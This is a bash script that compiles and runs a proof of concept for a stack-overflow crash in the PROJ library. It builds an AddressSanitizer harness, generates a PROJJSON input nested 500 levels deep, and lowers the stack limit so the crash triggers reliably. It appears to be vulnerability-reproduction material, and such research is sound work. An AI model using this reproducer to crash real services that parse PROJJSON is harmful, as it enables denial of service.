#!/usr/bin/env bash
# Build and run PoC: 02-crs-SF01-projjson-stack-overflow
set -e
PROJ_SRC="${PROJ_SRC:-/src/PROJ-latest}"
PROJ_LIB="${PROJ_LIB:-/proj4-latest-build/lib/libproj.a}"
SQLITE="${SQLITE:-/usr/lib/x86_64-linux-gnu/libsqlite3.so.0}"
POC_BIN=/tmp/crs_SF01_poc_capi
echo "[*] Compiling PoC ..."
clang++ -std=c++17 -fsanitize=address -fno-omit-frame-pointer -g -O1 \
    -I"$PROJ_SRC/src" -I"$PROJ_SRC/include" \
    "$(dirname "$0")/crs_SF01_poc_capi.cpp" \
    "$PROJ_LIB" -lpthread "$SQLITE" -ldl -lm \
    -o "$POC_BIN"
echo "[*] Generating 500-depth PROJJSON input ..."
python3 "$(dirname "$0")/crs_SF01_gen.py" 500 > /tmp/sf01_500.json

echo "[*] Running PoC (with 512KB stack to reliably trigger crash) ..."
(ulimit -s 512; ASAN_OPTIONS="halt_on_error=1:print_stacktrace=1:detect_leaks=0" \
    PROJ_DATA=/out/asan "$POC_BIN" /tmp/sf01_500.json 2>&1) || true
